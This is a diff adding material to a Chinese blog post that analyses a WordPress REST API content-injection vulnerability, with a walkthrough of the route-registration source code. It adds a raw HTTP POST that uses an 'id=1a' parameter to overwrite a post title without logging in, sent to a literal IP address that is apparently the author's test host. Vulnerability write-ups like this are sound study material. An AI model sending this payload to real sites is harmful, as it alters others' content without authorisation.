@@ -94,7 +94,14 @@ REST API到底是个什么东西？有什么用呢？
 
 这里借助<kbd>BurpSuite</kbd>使用<kbd>Update</kbd>功能来修改id为1的文章标题为<kbd>Attack test</kbd>
 
+`POST /wordpress/index.php/wp-json/wp/v2/posts/1?id=1a HTTP/1.1
+Host: 101.200.61.215
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Connection: close
+Content-Type: application/json
+Content-Length: 23
 
+{"title":"Attack test"}`
 
 查看一下返回：
 {% capture images %}
@@ -124,7 +131,24 @@ REST API到底是个什么东西？有什么用呢？
 
 `/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php`
 
-
+{% highlight html %}
+	public function register_routes() {
+		register_rest_route( $this->namespace, '/' . $this->rest_base, array(
+			array(
+				'methods'             => WP_REST_Server::READABLE,
+				'callback'            => array( $this, 'get_items' ),
+				'permission_callback' => array( $this, 'get_items_permissions_check' ),
+				'args'                => $this->get_collection_params(),
+			),
+			array(
+				'methods'             => WP_REST_Server::CREATABLE,
+				'callback'            => array( $this, 'create_item' ),
+				'permission_callback' => array( $this, 'create_item_permissions_check' ),
+				'args'                => $this->get_endpoint_args_for_item_schema( WP_REST_Server::CREATABLE ),
+			),
+			'schema' => array( $this, 'get_public_item_schema' ),
+		) );
+{% endhighlight %}
 
 这段函数的功能是注册REST API的路由，使用正则
 
